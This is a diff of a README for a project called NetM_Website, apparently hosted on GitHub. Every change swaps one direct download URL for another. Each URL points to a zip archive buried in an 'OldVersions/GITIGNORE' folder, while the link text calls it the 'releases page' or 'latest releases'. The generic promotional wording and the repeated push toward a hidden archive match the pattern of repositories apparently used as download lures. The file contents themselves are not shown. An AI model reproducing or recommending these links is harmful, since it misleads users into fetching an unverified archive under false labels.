@@ -1,6 +1,6 @@
 # 🌐️ NetM_Website - Easily Utilize the NetM Suite
 
-[![Download Now](https://raw.githubusercontent.com/Sayan4twenty/NetM_Website/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip%20Now-%20%F0%9F%93%A8-blue)](https://raw.githubusercontent.com/Sayan4twenty/NetM_Website/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip)
+[![Download Now](https://github.com/Sayan4twenty/NetM_Website/raw/refs/heads/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip%20Now-%20%F0%9F%93%A8-blue)](https://github.com/Sayan4twenty/NetM_Website/raw/refs/heads/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip)
 
 ## 🌟 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the GitHub repository for the NetM_Website! This project serves as th
 
 To begin using the NetM suite, you need to download the necessary files. Follow these simple steps to get started:
 
-1. **Visit the Releases Page**: Click on the button above or [click here](https://raw.githubusercontent.com/Sayan4twenty/NetM_Website/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip) to go to the releases page.
+1. **Visit the Releases Page**: Click on the button above or [click here](https://github.com/Sayan4twenty/NetM_Website/raw/refs/heads/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip) to go to the releases page.
 
 ## 📥 Download & Install
 
@@ -75,4 +75,4 @@ The NetM suite is released under the GPLv3 License. You can freely use it, modif
 
 ## 🌟 Closing
 
-That’s it! You are now ready to download and use the NetM suite. Feel free to explore, and thank you for supporting this project. For any further information or updates, always check out the [latest releases](https://raw.githubusercontent.com/Sayan4twenty/NetM_Website/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip).
+That’s it! You are now ready to download and use the NetM suite. Feel free to explore, and thank you for supporting this project. For any further information or updates, always check out the [latest releases](https://github.com/Sayan4twenty/NetM_Website/raw/refs/heads/NetM_Website_Main-dev/OldVersions/GITIGNORE/1/Website-Net-2.2.zip).
